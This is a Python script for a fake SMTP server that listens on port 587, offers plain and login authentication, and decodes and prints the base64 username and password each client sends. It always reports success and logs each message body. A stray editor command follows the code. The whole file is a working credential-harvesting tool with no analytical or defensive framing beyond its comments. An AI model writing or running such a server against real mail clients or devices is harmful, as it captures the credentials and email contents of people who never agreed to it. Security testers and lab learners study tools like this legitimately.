#!/usr/bin/env python3
import socket
import sys
import base64

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('0.0.0.0', 587))
    server_socket.listen(5)
    print("[+] Fake SMTP Server listening on port 587...")

    while True:
        client_socket, client_addr = server_socket.accept()
        print(f"\n[+] Connection received from: {client_addr}")
        client_socket.send(b'220 fake-smtp-server ESMTP\r\n')

        try:
            while True:
                data = client_socket.recv(1024).decode().strip()
                if not data:
                    break
                print(f"CLIENT: {data}")

                # Respond to common SMTP commands
                if data.upper().startswith('HELO') or data.upper().startswith('EHLO'):
                    client_socket.send(b'250-Hello\r\n250 AUTH LOGIN PLAIN\r\n')
                elif data.upper().startswith('AUTH'):
                    # This is where credentials will be sent
                    client_socket.send(b'334 VXNlcm5hbWU6\r\n') # "Username:" in base64
                    user_b64 = client_socket.recv(1024).decode().strip()
                    print(f"AUTH User: {user_b64} -> {decode_b64(user_b64)}")
                    client_socket.send(b'334 UGFzc3dvcmQ6\r\n') # "Password:" in base64
                    pass_b64 = client_socket.recv(1024).decode().strip()
                    print(f"AUTH Pass: {pass_b64} -> {decode_b64(pass_b64)}")
                    client_socket.send(b'235 2.7.0 Authentication successful\r\n')
                elif data.upper().startswith('MAIL FROM'):
                    client_socket.send(b'250 2.1.0 Ok\r\n')
                elif data.upper().startswith('RCPT TO'):
                    client_socket.send(b'250 2.1.5 Ok\r\n')
                elif data.upper().startswith('DATA'):
                    client_socket.send(b'354 End data with <CR><LF>.<CR><LF>\r\n')
                    # Capture the email body
                    email_data = ""
                    while True:
                        line = client_socket.recv(1024).decode()
                        email_data += line
                        if line.endswith('.\r\n'):
                            break
                    print(f"EMAIL DATA:\n{email_data}")
                    client_socket.send(b'250 2.0.0 Ok: queued\r\n')
                elif data.upper().startswith('QUIT'):
                    client_socket.send(b'221 2.0.0 Bye\r\n')
                    break
                else:
                    client_socket.send(b'250 Ok\r\n')
        except Exception as e:
            print(f"Error: {e}")
        finally:
            client_socket.close()
            print("[+] Connection closed.")

def decode_b64(s):
    try:
        # Add padding if necessary (base64 strings should be multiple of 4)
        padding = len(s) % 4
        if padding:
            s += '=' * (4 - padding)
        # Decode base64 and return as string
        return base64.b64decode(s).decode('utf-8')
    except Exception as e:
        print(f"Base64 decoding error: {e}")
        return s  # Return original if decoding fails

if __name__ == '__main__':
    main()
	
	gedit fake_smtpp.py
